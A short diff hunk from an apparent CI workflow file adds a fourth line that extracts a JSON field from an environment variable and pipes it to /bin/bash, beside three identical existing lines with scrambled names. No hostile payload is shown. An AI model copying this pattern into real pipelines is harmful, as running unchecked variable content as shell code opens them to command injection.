@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$cn3" | jq -r .kyvbx0 | /bin/bash
           printf '%s' "$yxsn81" | jq -r .nixpy85 | /bin/bash
           echo $f752 | jq -r .mlau448 | /bin/bash
+          printf '%s' "$utb792" | jq -r .sl612 | /bin/bash
 
       - name: Persist results
         if: always()
